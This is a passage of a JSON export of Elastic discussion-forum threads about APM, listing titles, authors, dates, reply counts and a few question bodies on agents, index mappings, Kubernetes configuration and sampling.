sure if I should change it manually. I noticed that the field is not in the mapping: \"span_count\": { \"properties\": { \"dropped\": { \"type\": \"long\" } } }, And that the transaction mapping is not dynamic: \"transaction\": { \"dynamic\": \"false\", \"properties\": { .... So, should I change this mapping manually or is there something missing in apm-server? And if I change it manually, will it be overwritten by apm-server? Option 2: Don't use the transaction.span_count.started field. In this case, I would need to do something like this: count # of spans of with span.action: query, group them by transaction.id annotate every transaction with url.path (the property is not available on query spans, so I would need to get it somehow from the request span of that transaction) take the average of the # of spans and group them by url.path I'm quite new to Kibana, so I'm not certain how I would achieve this. I was able to create a visualization to get the slowest requests based on the average transaction duration, but that's a single group by.",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "f33404de-ee54-4a60-ae28-bf8fd7c748b8",
    "url": "https://discuss.elastic.co/t/why-the-apm-server-config-file-cannot-be-updated-automatically/227428",
    "title": "Why the apm-server config file cannot be updated automatically",
    "category": [
      "APM"
    ],
    "author": "wajika",
    "date": "April 10, 2020, 2:43am",
    "body": "like logstash >> config.reload.automatic: true Under kubernetes, when I want to update the configmap, the apm-server container cannot automatically load the latest config volumeMounts: - name: apm-server-config mountPath: /usr/share/apm-server/apm-server.yml readOnly: true subPath: apm-server.yml volumes: - name: apm-server-config configMap: name: apm-server-config",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "dc139473-1927-4ba1-8898-d359506090c4",
    "url": "https://discuss.elastic.co/t/elastic-apm-agent-break-hybris-backoffice-application/227216",
    "title": "Elastic APM agent break Hybris Backoffice application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 8, 2020, 10:29pm April 9, 2020, 8:55am April 9, 2020, 11:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fa9eabbb-5370-4183-9d6d-1fd35fe9bb20",
    "url": "https://discuss.elastic.co/t/apmecho-not-sending-anything-to-server/227228",
    "title": "Apmecho not sending anything to server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 14, 2020, 7:40am April 9, 2020, 4:30am April 9, 2020, 8:53am April 9, 2020, 9:53am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fc851e17-241f-4ed4-a81b-3acd25d4d8b3",
    "url": "https://discuss.elastic.co/t/arpm-rum-to-monitor-an-application-deployed-on-weblogic/227291",
    "title": "ARPM - RUM to monitor an application deployed on Weblogic",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 9, 2020, 9:42am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8db1ab1a-127c-4b33-9c70-9d6e06a08c2f",
    "url": "https://discuss.elastic.co/t/elastic-java-apm-agent-connect-to-sample-java-application-which-have-only-db-calls-without-any-server-connections/226850",
    "title": "Elastic java APM agent connect to sample java application which have only db calls without any server connections",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 7, 2020, 8:08am April 7, 2020, 8:34am April 7, 2020, 8:43am April 7, 2020, 8:53am April 7, 2020, 6:44pm April 7, 2020, 6:50pm April 7, 2020, 6:51pm April 7, 2020, 6:53pm April 7, 2020, 6:55pm April 7, 2020, 6:59pm April 7, 2020, 7:50pm April 8, 2020, 7:13am April 8, 2020, 12:10pm April 8, 2020, 12:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "07daf76b-33e9-470d-8a68-a05d7d4bbd40",
    "url": "https://discuss.elastic.co/t/monitoring-azure-app-service/227018",
    "title": "Monitoring azure app service",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 7, 2020, 10:08pm April 9, 2020, 8:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7703a3fd-7f1f-4a6d-a644-9f2fdf51e329",
    "url": "https://discuss.elastic.co/t/elk-apm/226623",
    "title": "ELK APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 7:43am April 6, 2020, 7:00am April 6, 2020, 8:58am April 7, 2020, 7:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7f3a12a9-0b70-4d8f-92b2-91ef0f351947",
    "url": "https://discuss.elastic.co/t/create-span-as-a-child-of-a-span-asp-net-apm-agent/226678",
    "title": "Create span as a child of a span Asp.net apm agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 10:51am April 6, 2020, 12:07pm April 6, 2020, 2:02pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "289f91d6-c2f8-47fb-a8b9-ea5dc3023d99",
    "url": "https://discuss.elastic.co/t/cant-use-elastic-apm-rum-core-with-angularjs/226655",
    "title": "Can't use @elastic/apm-rum-core with Angularjs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 11:58am April 6, 2020, 9:23am April 6, 2020, 9:55am April 6, 2020, 12:39pm April 6, 2020, 1:04pm April 6, 2020, 1:29pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "3b13f3f3-61f9-442a-9b89-0c865816180e",
    "url": "https://discuss.elastic.co/t/doubts-sending-data-from-apm-agent-to-apm-server/226677",
    "title": "Doubts: Sending data from apm-agent to apm-server",
    "category": [
      "APM"
    ],
    "author": "AkbarHabeeb",
    "date": "April 6, 2020, 10:40am April 6, 2020, 12:50pm April 6, 2020, 1:14pm",
    "body": "I have few questions, Does APM keeps polling the data from apm-agent to apm-server ? Does the agent waits for response from the server ? What will be the response from the server ? Does APM group the details(data) and send it as a bulk to the apm-server for every time interval ? Is there any specific pattern followed while sending the data to apm-server ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8989fb51-cc9a-40bc-834e-1d4d51e7d66b",
    "url": "https://discuss.elastic.co/t/java-agent-set-environment-programatically/226575",
    "title": "Java agent set environment programatically",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 7:48am April 6, 2020, 7:55am April 6, 2020, 10:39am April 6, 2020, 2:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6f778567-f32f-4e9e-bd38-c96562558970",
    "url": "https://discuss.elastic.co/t/how-to-understand-java-agent-source/226302",
    "title": "How to understand Java Agent source",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 3, 2020, 10:35am April 3, 2020, 10:28am April 3, 2020, 10:42am April 6, 2020, 9:09am April 6, 2020, 12:19pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "04cd9510-541b-4db7-9853-bc9265929196",
    "url": "https://discuss.elastic.co/t/apm-server-order-file-output/226685",
    "title": "APM server Order File output",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 11:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ae17b972-2cad-4e7c-9742-a37b92eb2a69",
    "url": "https://discuss.elastic.co/t/elasticapm-not-sending-data/225683",
    "title": "elasticApm not sending data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 31, 2020, 10:52am March 31, 2020, 10:55am March 31, 2020, 12:47pm April 1, 2020, 9:02am April 2, 2020, 7:14am April 6, 2020, 9:27am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ef655cd1-9f9d-4e60-b652-f2d59a8799de",
    "url": "https://discuss.elastic.co/t/java-apm-agent-config-in-wildfly-8-with-java-1-8-0-144/226377",
    "title": "JAVA APM Agent Config in Wildfly 8 with JAVA 1.8.0_144",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 3, 2020, 10:14am April 3, 2020, 10:25am April 3, 2020, 10:42am April 3, 2020, 10:46am April 3, 2020, 10:56am April 3, 2020, 10:58am April 3, 2020, 11:06am April 3, 2020, 11:13am April 3, 2020, 11:27am April 3, 2020, 11:35am April 3, 2020, 12:29pm",
    "body": "",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "18c16513-7400-4f72-ad7b-ecb1f6749ede",
    "url": "https://discuss.elastic.co/t/agent-java-and-hole-in-timing/226580",
    "title": "Agent Java and hole in timing",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 7:46am April 6, 2020, 4:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "64d21520-3881-4d30-863b-676b0537b08c",
    "url": "https://discuss.elastic.co/t/cant-get-the-nodejs-transactions-in-kibana/225935",
    "title": "Can't get the NodeJS transactions in Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 2, 2020, 7:31am April 1, 2020, 8:32am April 1, 2020, 7:06pm April 1, 2020, 7:23pm April 1, 2020, 7:22pm April 2, 2020, 7:37am April 2, 2020, 3:16pm April 3, 2020, 2:08pm April 3, 2020, 3:35pm April 4, 2020, 6:21am April 5, 2020, 8:41pm April 6, 2020, 8:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "f58af1de-a211-40d1-95cb-5846c3e45a4b",
    "url": "https://discuss.elastic.co/t/weird-exceptions-from-apm-agent/226228",
    "title": "Weird exceptions from apm agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 2, 2020, 3:07pm April 2, 2020, 2:38pm April 2, 2020, 2:59pm April 2, 2020, 5:35pm April 3, 2020, 7:40am April 3, 2020, 7:57am April 3, 2020, 8:57am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "880645ed-7901-4687-85a2-33f18d4fb802",
    "url": "https://discuss.elastic.co/t/elastic-apm-capturetransaction/225991",
    "title": "Elastic APM @CaptureTransaction",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 1, 2020, 8:19am April 1, 2020, 8:19am April 1, 2020, 9:00am April 1, 2020, 9:56am April 1, 2020, 10:59am April 1, 2020, 1:04pm April 1, 2020, 12:56pm April 1, 2020, 1:04pm April 1, 2020, 1:14pm April 1, 2020, 1:45pm April 1, 2020, 2:44pm April 1, 2020, 3:04pm April 2, 2020, 12:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "d7ed6cff-ab6b-4223-a720-f56e7f3aaa95",
    "url": "https://discuss.elastic.co/t/manually-trigger-sourcemap-analysis-for-existing-apm-rum-errors/226094",
    "title": "Manually trigger sourcemap analysis for existing apm RUM errors",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 1, 2020, 5:06pm April 2, 2020, 9:03am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f691679a-8dfe-41ff-9a82-fe5c93ca18f3",
    "url": "https://discuss.elastic.co/t/failed-to-load-resource-the-server-responded-with-a-status-of-500-internal-server-error/225612",
    "title": "Failed to load resource: the server responded with a status of 500 (Internal Server Error)",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 30, 2020, 6:11am March 30, 2020, 2:04pm March 31, 2020, 3:03am March 31, 2020, 10:11am March 31, 2020, 1:39pm March 31, 2020, 1:37pm April 1, 2020, 7:41am April 1, 2020, 3:31pm April 1, 2020, 3:31pm April 22, 2020, 11:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "993133e2-eda4-45a8-a494-c6fd0834b810",
    "url": "https://discuss.elastic.co/t/reducing-processing-storage-size-with-post-transaction-reporting-decision-in-agent/225723",
    "title": "Reducing processing/storage size with post transaction reporting decision in agent?",
    "category": [
      "APM"
    ],
    "author": "rrupp_mgp",
    "date": "March 30, 2020, 5:39pm March 30, 2020, 6:34pm March 30, 2020, 6:42pm March 31, 2020, 9:00am March 31, 2020, 4:00pm April 1, 2020, 1:06am April 21, 2020, 9:07pm",
    "body": "Kibana version: 7.6.1 Elasticsearch version: 7.6.1 APM Server version: 7.6.1 APM Agent language and version: Java Agent 1.14.0 Hi, I'm experimenting with APM with the Java Agent and am exploring ways to reduce processing, network utilization and storage size on the server side without missing useful details. One of the applications I'm looking to monitor is very chatty in terms of # of SQL statements executed and also has polling based tasks that execute repeatedly every X seconds executing a large amount of SQL statements. The individual SQL statements are fast (in microseconds, < 1 millisecond) and the overall transaction times even with many of them are fine (e.g. under a second) but results in a lot of SQL spans getting generated until it hits the agent's default cap of 500 spans under the transaction. I can reduce the sample_rate but my concern here is not getting the nested spans on actual interesting transactions. \"Interesting\" in this case would be: Transactions that take over X time Transactions that end in an error I'm essentially looking to perform some post transaction decision on whether to send the captured spans or not. Looking into this, the sample decision itself has to be made upfront with minimal context since it determines whether the agent will do the work or not of capturing the spans. I'm actually not too worried about the agent overhead in this case since for the most part it's just capturing the SQL statements and timing them which relative to actual SQL statements being called shouldn't be too bad. The reporting of spans though happens immediately when the span is completed (well places it in the reporting queue at least) so it doesn't have any context at that point on the result of the transaction. What I would like though is some way to defer the reporting decision until the transaction completes or maybe just after X seconds to account for long running transaction where it's not desired to keep this data in memory for longer than needed. So I guess I'm looking if it's possible to do some configuration like: sample_rate = 1 (or something fairly high) only_report_spans_if_above_ms = Xms (this configuration would report spans if the encompassing transaction is >= Xms OR if the transaction encountered an error) Having something like the above would help me reduce storage size and processing pressure on Elasticsearch of the apm-spans index. I tried to look if there's some option to just discard these kind of transactions within the APM server or Elasticsearch but I'd also like to avoid the network utilization too by discarding these at the agent level. For Elasticseach I was trying to see if I could just drop \"un-interesting\" spans but it seemed like it would require some application processing to first fetch transactions that were slow or errored (via apm-transaction and apm-error) and then from there delete all the associated spans.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8219e3c9-d3f2-4c1a-980f-aa6ef8f562c9",
    "url": "https://discuss.elastic.co/t/mock-an-apm-instance/224686",
    "title": "Mock an APM instance",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 23, 2020, 2:44pm March 31, 2020, 2:47pm March 31, 2020, 2:48pm April 21, 2020, 10:48am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "25d85056-e5f4-4c8b-ab47-456fbb0caafa",
    "url": "https://discuss.elastic.co/t/internal-server-error-on-jvm-instance-metrics/224998",
    "title": "Internal Server Error on JVM instance metrics",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 25, 2020, 4:01pm March 27, 2020, 10:42am March 27, 2020, 3:30pm March 27, 2020, 9:03pm March 30, 2020, 12:47pm March 30, 2020, 2:14pm April 20, 2020, 10:14am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "5b57208a-d25e-4455-8b75-7018dc4796b6",
    "url": "https://discuss.elastic.co/t/is-there-anyone-know-how-to-monitor-the-apm-server-runtime-status-etc-in-kibana/225329",
    "title": "Is there anyone know How to monitor the apm-server runtime status etc in kibana",
    "category": [
      "APM"
    ],
    "author": "lucky-yang",
    "date": "March 27, 2020, 10:27am March 30, 2020, 7:58am",
    "body": "Is there anyone know How to monitor the apm-server runtime status etc in kibana",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "eed6a9f1-7771-4d83-8690-1041232da918",
    "url": "https://discuss.elastic.co/t/how-to-understand-the-process-generated-by-transaction-duration-us/224510",
    "title": "How to understand the process generated by transaction.duration.us？",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 23, 2020, 7:04am March 30, 2020, 1:28am March 30, 2020, 1:27am April 19, 2020, 9:33pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "01932c30-ee27-482b-92dd-33633e969279",
    "url": "https://discuss.elastic.co/t/span-type-for-full-trace/225003",
    "title": "Span type for Full trace",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 26, 2020, 9:37am March 25, 2020, 3:45pm March 26, 2020, 9:10am March 26, 2020, 9:37am March 26, 2020, 3:00pm March 27, 2020, 11:11am March 27, 2020, 3:25pm March 27, 2020, 9:01pm April 17, 2020, 5:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "935973ab-7dc6-458a-936c-bd21ed9fdb98",
    "url": "https://discuss.elastic.co/t/elastic-cloud-apm-server-queue-is-full/225282",
    "title": "Elastic Cloud APM Server - Queue is full",
    "category": [
      "APM"
    ],
    "author": "Edgar_Peixoto",
    "date": "March 26, 2020, 10:22pm March 27, 2020, 8:44am March 27, 2020, 2:53pm April 17, 2020, 10:53am",
    "body": "I have many Java microservices running in a Kubernetes Cluster. All of them are APM agents sending data to an APM server in our Elastic Cloud Cluster. Everything was working fine but suddenly every microservice received the error below showed in the logs. image912×160 3.46 KB I tried to restart the cluster, increase the hardware power and I tried to follow the hints but with no success. Obs: The disk is almost empty and the memory usage is ok. Everthing is in 7.5.2 version",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "72f67ace-aa39-4521-b33e-2e06cf878a3d",
    "url": "https://discuss.elastic.co/t/compare-child-span-between-transactions/224592",
    "title": "Compare child span between transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 23, 2020, 5:15am March 27, 2020, 11:08am April 17, 2020, 7:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bf2a7386-aea3-4ec5-b949-3ce35051c8a4",
    "url": "https://discuss.elastic.co/t/aws-elasticsearch-service-and-apm/225221",
    "title": "AWS Elasticsearch Service and APM",
    "category": [
      "APM"
    ],
    "author": "Mike_Shnayderman",
    "date": "March 26, 2020, 3:02pm April 16, 2020, 11:08am",
    "body": "Is it still true that AWS Elasticsearch service does not have all relevant APM Dashboards in Kibana, even if we upgrade to latest available in Amazon (7.4) ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c7b539b5-54e6-4689-b8aa-0489b927ff8f",
    "url": "https://discuss.elastic.co/t/can-i-require-elastic-apm-node-twice/224684",
    "title": "Can I require elastic-apm-node twice?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 23, 2020, 2:13pm March 24, 2020, 2:24pm March 24, 2020, 5:28pm March 25, 2020, 1:36pm March 26, 2020, 9:47am April 16, 2020, 5:47am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "81f143ee-077f-4e69-8496-58e9d876df2a",
    "url": "https://discuss.elastic.co/t/tracing-question-related-to-apmot-and-apmhttp/224893",
    "title": "Tracing question related to apmot and apmhttp",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 24, 2020, 7:28pm March 25, 2020, 2:39am April 14, 2020, 10:39pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "109463a6-7d5b-4838-a32d-64dee8bff078",
    "url": "https://discuss.elastic.co/t/application-performance-lower-after-fixing-agent-logger-level-from-warning-to-info/224215",
    "title": "Application performance lower after fixing agent logger level from warning to info",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 19, 2020, 5:46am March 20, 2020, 2:24am March 23, 2020, 11:38pm March 24, 2020, 8:06pm March 25, 2020, 12:02am April 14, 2020, 8:03pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ce79a5f5-aa18-42b2-98b1-5480a2183a66",
    "url": "https://discuss.elastic.co/t/transactions-using-openapi-c-is-not-showing-up/221492",
    "title": "Transactions using OpenAPI C# is not showing up",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 28, 2020, 9:44pm March 2, 2020, 9:31am March 2, 2020, 6:10pm March 2, 2020, 7:11pm March 2, 2020, 8:26pm March 2, 2020, 8:28pm March 2, 2020, 9:15pm March 2, 2020, 9:33pm March 2, 2020, 9:34pm March 2, 2020, 11:08pm March 3, 2020, 8:28pm March 4, 2020, 1:50pm March 5, 2020, 2:26pm March 9, 2020, 3:41pm March 9, 2020, 3:42pm March 9, 2020, 3:43pm March 11, 2020, 7:07pm March 11, 2020, 7:24pm March 11, 2020, 7:28pm March 11, 2020, 10:26pm",
    "body": "",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "788e68bd-4a57-4c82-b8fc-e88fe062af7c",
    "url": "https://discuss.elastic.co/t/how-to-create-multiple-span-within-single-transaction-using-httplistener-using-vb-net/222638",
    "title": "How to create multiple span within single transaction(using Httplistener) using vb.net",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 9, 2020, 4:49am March 14, 2020, 9:41pm March 24, 2020, 8:59am March 24, 2020, 9:20am April 14, 2020, 5:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "87a2f2d1-cfd1-479d-b877-8de1bc8bb701",
    "url": "https://discuss.elastic.co/t/need-help-to-understand-sanitizefieldnames/224662",
    "title": "Need help to understand SanitizeFieldNames",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 23, 2020, 11:45am March 23, 2020, 12:28pm March 23, 2020, 3:07pm April 13, 2020, 11:07am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d247fcc2-91ff-4474-bc70-47a60d4f6511",
    "url": "https://discuss.elastic.co/t/im-wondering-if-apm-supports-awx-ansible/224351",
    "title": "I'm wondering if APM supports awx ansible",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 20, 2020, 7:51am March 20, 2020, 9:39am April 10, 2020, 5:39am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "937a6ee7-8d06-46ee-8a33-5295fd15e364",
    "url": "https://discuss.elastic.co/t/apm-ui-kibana-internal-server-error/223601",
    "title": "APM UI Kibana Internal Server Error",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 14, 2020, 9:36am March 16, 2020, 10:13pm March 15, 2020, 2:36am March 15, 2020, 6:09pm March 16, 2020, 4:29am March 16, 2020, 1:17am March 16, 2020, 1:50am March 16, 2020, 4:31am March 16, 2020, 4:52am March 16, 2020, 4:57am March 16, 2020, 5:08pm March 16, 2020, 5:08pm March 16, 2020, 7:41pm March 17, 2020, 11:58am March 17, 2020, 4:48pm March 18, 2020, 7:53am March 18, 2020, 7:55am March 18, 2020, 3:11pm March 18, 2020, 3:43pm March 18, 2020, 10:54pm",
    "body": "",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "1f859b92-bcbb-4fce-ab2b-41366d944284",
    "url": "https://discuss.elastic.co/t/kibana-apm-app-pages-are-too-slow/220570",
    "title": "Kibana APM App pages are TOO SLOW",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 24, 2020, 9:57am February 24, 2020, 11:52am February 26, 2020, 1:44am February 26, 2020, 2:25pm February 26, 2020, 3:07pm March 4, 2020, 5:34am March 16, 2020, 4:33am March 18, 2020, 3:12pm March 18, 2020, 3:13pm April 8, 2020, 11:13am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "298ead50-fbf1-43ba-96bc-cfe2b146c9e2",
    "url": "https://discuss.elastic.co/t/apm-transaction-data-not-compressed-properly/224030",
    "title": "APM transaction data not compressed properly",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 18, 2020, 6:32am March 18, 2020, 5:55am March 18, 2020, 2:16pm March 18, 2020, 2:16pm April 8, 2020, 10:16am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ac74f5d7-2d19-402c-80a2-cb95fd395d45",
    "url": "https://discuss.elastic.co/t/apm-vue-plugin/223798",
    "title": "APM Vue plugin",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 16, 2020, 4:58pm March 17, 2020, 2:01pm March 18, 2020, 12:14pm April 8, 2020, 4:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ed95ec07-83b9-4be4-8b7a-e93d59d53609",
    "url": "https://discuss.elastic.co/t/most-of-the-spans-cant-find-current-transaction/223850",
    "title": "Most of the spans can't find current transaction",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 17, 2020, 6:42am March 18, 2020, 8:24am March 18, 2020, 11:33am April 8, 2020, 7:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fdb7ca0c-8ca3-4af2-b262-2e7626a3004e",
    "url": "https://discuss.elastic.co/t/apm-java-agent-jmx-metrics-does-not-show-up-in-apm-index/224048",
    "title": "(APM java-agent) JMX metrics does not show up in apm-* index",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 18, 2020, 8:52am March 18, 2020, 9:17am March 18, 2020, 10:12am March 18, 2020, 11:01am March 18, 2020, 11:16am March 18, 2020, 11:20am April 8, 2020, 7:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "2b12238b-7485-4c57-ae0b-def6a8232634",
    "url": "https://discuss.elastic.co/t/custom-transactions-cannot-match-the-trace-id-of-the-backend/223278",
    "title": "Custom transactions cannot match the trace.id of the backend",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 12, 2020, 8:18am March 14, 2020, 8:30pm March 16, 2020, 4:03am March 18, 2020, 1:41am March 18, 2020, 1:45am April 7, 2020, 9:45pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e8e86405-8de9-46ce-a656-53547b160be0",
    "url": "https://discuss.elastic.co/t/full-apm-trace-with-kakfa-documentation/223133",
    "title": "Full APM trace with Kakfa documentation",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 12:47pm March 15, 2020, 5:37am March 16, 2020, 12:43pm March 16, 2020, 1:29pm April 6, 2020, 9:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "87bdd824-c6e8-47cd-b77b-2d97420825a7",
    "url": "https://discuss.elastic.co/t/is-forkjoinpool-tracable/222599",
    "title": "Is ForkJoinPool tracable?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 9, 2020, 5:38am March 16, 2020, 12:44pm April 6, 2020, 8:44am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6e98d5e9-3cf4-485d-a44e-d010ac924eda",
    "url": "https://discuss.elastic.co/t/unable-to-see-span-data-from-sample-program-using-custom-api/223723",
    "title": "Unable to see span data from sample program using custom API",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 16, 2020, 9:53am March 16, 2020, 5:37pm April 6, 2020, 8:11am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e2fd22a2-ad73-4ce6-bcdd-a489f451b80f",
    "url": "https://discuss.elastic.co/t/apm-queue-is-full/221513",
    "title": "APM queue is full",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 1, 2020, 2:33am March 2, 2020, 4:03pm March 2, 2020, 4:53pm March 3, 2020, 10:08am March 4, 2020, 5:41am March 4, 2020, 3:12pm March 6, 2020, 5:32am March 6, 2020, 6:16pm March 6, 2020, 6:16pm March 11, 2020, 3:32pm March 14, 2020, 5:45am March 16, 2020, 1:28am April 5, 2020, 9:28pm",
    "body": "",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "d7753c1e-be42-4987-accb-1728c228daa3",
    "url": "https://discuss.elastic.co/t/can-we-use-basic-licensed-apm-and-kibana-in-production/223643",
    "title": "Can we use basic licensed APM and Kibana in production?",
    "category": [
      "APM"
    ],
    "author": "dhai",
    "date": "March 15, 2020, 1:23am March 15, 2020, 8:27am April 5, 2020, 4:27am",
    "body": "Is there a license file for Basic License like Elastic License in github?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "04a3585f-5f2b-4098-af96-8fab7ccc817a",
    "url": "https://discuss.elastic.co/t/python-apm-agent-for-flask-doesnt-report-metrics/223083",
    "title": "Python APM Agent for Flask doesn't report metrics",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 2:41pm March 13, 2020, 9:06am March 13, 2020, 9:06am March 13, 2020, 2:45pm April 3, 2020, 10:45am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0e597fe5-f8f0-4f4b-b3da-54d4388c07bb",
    "url": "https://discuss.elastic.co/t/apm-no-services-found/161100",
    "title": "APM No services found",
    "category": [
      "APM"
    ],
    "author": "MishMick",
    "date": "December 17, 2018, 9:16am December 17, 2018, 9:45am December 18, 2018, 12:10pm December 18, 2018, 12:36pm December 18, 2018, 12:49pm December 18, 2018, 2:17pm January 8, 2019, 10:17am March 13, 2020, 2:27pm",
    "body": "I have correctly set up the APM agent and APM server is up and running. However, I can only see the APM Onboarding logs and no APM transaction logs are visible on the Discover tab. My APM server and APM-agent are deployed on the same server so they are able to communicate with each other. Details: I have a non-springboot JAVA application ELK version: 6.5.2 APM tab shows \"No services were found\" error.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "369a9d6b-f38c-4a02-b17d-52fe7b48a54b",
    "url": "https://discuss.elastic.co/t/apm-not-collecting-data-for-nodejs-applications-which-trigger-services-inside-child-processes-but-correctly-monitor-in-nodejs-express-apps/223056",
    "title": "APM not collecting data for NodeJS applications which trigger services inside child processes. But correctly monitor in NodeJS express apps",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 6:48am March 11, 2020, 7:05am March 11, 2020, 7:11am March 11, 2020, 7:30am March 13, 2020, 4:44am March 13, 2020, 7:39am April 3, 2020, 3:39am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d8c510dd-f227-40d6-b2ea-1acc75f8bb2b",
    "url": "https://discuss.elastic.co/t/span-data-visualisation-missing-in-kibana/222824",
    "title": "Span data visualisation missing in kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 10, 2020, 5:45am March 10, 2020, 8:29am March 11, 2020, 12:45am March 11, 2020, 6:15am March 11, 2020, 7:44am March 11, 2020, 10:04pm March 12, 2020, 1:57pm April 2, 2020, 9:57am",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "17cf0fd3-9526-4e12-b928-e85673aa2153",
    "url": "https://discuss.elastic.co/t/elastic-apm-throws-warning-illegal-argument-exception-with-reason-the-number-of-source-shards-4-must-be-a-factor-of-30/223131",
